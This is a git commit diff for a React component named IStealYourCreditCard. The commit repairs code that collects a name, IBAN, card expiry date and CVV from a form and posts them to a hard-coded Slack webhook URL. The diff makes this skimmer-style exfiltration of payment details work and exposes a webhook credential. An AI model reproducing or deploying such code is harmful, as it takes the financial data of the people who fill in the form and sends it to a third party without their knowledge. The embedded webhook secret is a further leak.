5bd234a554e66caab563fe6cdc77eefa060c9e6e
IveNooName <226706111+IveNooName@users.noreply.github.com>
2026-08-27 14:44:25 +0200

    fixed slack sending

--- src/components/IStealYourCreditCard/IStealYourCreditCard.tsx
+++ src/components/IStealYourCreditCard/IStealYourCreditCard.tsx
@@ -2,13 +2,13 @@ import "./IStealYourCreditCard.css";
 import {useState} from "react";
 
 async function sendToSlack(message: string) {
-    const respone = await fetch('https://hooks.slack.com/services/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', {
+    const response = await fetch('https://hooks.slack.com/services/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', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ message: message }),
-    })
+        headers: {'Content-Type': 'text/plain'},
+        body: JSON.stringify({text: message}),
+    });
 
-    if(!respone.ok) {
+    if (!response.ok) {
         throw new Error('Sending to Slack failed');
     }
 }
@@ -21,11 +21,11 @@ function IStealYourCreditCard() {
         iban: '',
         expiryDate: '',
         cvv: 0,
-    })
+    });
 
     function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
-        const { name, value } = e.target;
-        setFormData(prev => ({ ...prev, [name]: value }));
+        const {name, value} = e.target;
+        setFormData(prev => ({...prev, [name]: value}));
     }
 
     return (
@@ -36,34 +36,46 @@ function IStealYourCreditCard() {
 
             <div className="input-group py-1">
                 <div className="form-floating">
-                    <input className="form-control" type="text" id="credit-card-full-name" placeholder="Name" onChange={handleChange} />
+                    <input className="form-control" type="text" id="credit-card-full-name" placeholder="Name"
+                           onChange={handleChange}/>
                     <label htmlFor="credit-card-full-name">Full Name</label>
                 </div>
 
                 <div className="form-floating">
                     <input className="form-control" type="text" id="credit-card-iban" placeholder=""
-                           spellCheck="false" onChange={handleChange} />
+                           spellCheck="false" onChange={handleChange}/>
                     <label htmlFor="credit-card-iban">IBAN</label>
                 </div>
             </div>
             <div className="input-group py-1">
                 <div className="form-floating">
                     <input className="form-control" type="text" autoComplete="cc-exp" id="credit-card-expiration-date"
-                           placeholder="" name={formData.fullName} onChange={handleChange} />
+                           placeholder="" name={formData.fullName} onChange={handleChange}/>
                     <label htmlFor="credit-card-expiration-date">Expiration date</label>
                 </div>
                 <div className="form-floating">
                     <input className="form-control" type="number" autoComplete="cc-cvv" id="credit-card-cvv"
-                           placeholder="" onChange={handleChange} />
+                           placeholder="" onChange={handleChange}/>
                     <label htmlFor="credit-card-cvv">CVV</label>
                 </div>
             </div>
             <div className={"credit-card-button-container py-4"}>
-                <button className="btn btn-primary credit-card-button" type="submit" onSubmit={() => {
-                    await sendToSlack(
-                        `Name: ${formData.fullName}\n IBAN: ${formData.cvv} \n Expiration Date: ${formData.expiryDate}\n CVV: ${formData.cvv}`,
-                    )
-                }}>Submit</button>
+                <button className="btn btn-primary credit-card-button" type="submit" onClick={async () => {
+                    console.log(formData);
+                        try {
+                            await sendToSlack(
+                                `New Message from the React-Website!!🥳\n`+
+                                `Name: ${formData.fullName}\n`+
+                                `IBAN: ${formData.iban}\n`+
+                                `Expiration Date: ${formData.expiryDate}\n`+
+                                `CVV: ${formData.cvv}`,
+                            );
+                        } catch (err) {
+                            console.log(err);
+                        }
+                    }
+                }>Submit
+                </button>
             </div>
         </div>
     );
